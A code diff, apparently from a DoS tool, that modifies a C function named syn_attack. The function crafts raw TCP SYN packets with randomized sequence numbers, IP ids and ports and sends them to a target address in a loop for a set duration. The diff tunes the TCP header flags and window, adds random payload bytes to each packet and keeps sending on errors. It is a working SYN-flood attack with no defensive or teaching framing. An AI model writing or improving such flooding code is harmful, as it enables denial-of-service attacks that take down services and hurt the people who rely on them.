@@ -59,25 +59,30 @@ void* syn_attack(void* arg) {
     iph->saddr = INADDR_ANY;
     iph->daddr = params->target_addr.sin_addr.s_addr;
 
-    // linux/ip.h alternative (24 may, 2025)
     uint16_t src_port = params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() & 0xFFFF);
     tcph->source = htons(src_port);
     tcph->dest = params->target_addr.sin_port;
     tcph->seq = htonl((uint32_t)rand());
     tcph->ack_seq = 0;
-    tcph->doff = 5;
+    tcph->doff = 10;
     tcph->syn = 1;
     tcph->ack = 0;
-    tcph->psh = 1;
-    tcph->rst = 1;
+    tcph->psh = 0;
+    tcph->rst = 0;
     tcph->fin = 0;
     tcph->urg = 0;
-    tcph->window = htons(512);
+    tcph->window = htons(64);
     tcph->check = 0;
     tcph->urg_ptr = 0;
 
     time_t end_time = time(NULL) + params->duration;
     while (params->active && time(NULL) < end_time) {
+        unsigned char *data = packet + ip_size + tcp_size;
+        size_t data_len = packet_size - (ip_size + tcp_size);
+        for (size_t i = 0; i < data_len; i++) {
+            data[i] = rand() & 0xFF;
+        }
+
         iph->id = htons((uint16_t)(rand() & 0xFFFF));
         iph->check = 0;
         tcph->check = 0;
@@ -85,7 +90,7 @@ void* syn_attack(void* arg) {
         iph->check = generic_checksum((unsigned short*)iph, ip_size);
         tcph->check = tcp_udp_checksum(tcph, tcp_size, iph->saddr, iph->daddr, IPPROTO_TCP);
         
-        ssize_t sent = sendto(syn_sock, packet, packet_size, 0, 
+        ssize_t sent = sendto(syn_sock, packet, packet_size, MSG_NOSIGNAL, 
                             (struct sockaddr*)&dest, sizeof(dest));
         if (sent < 0) break;
     }
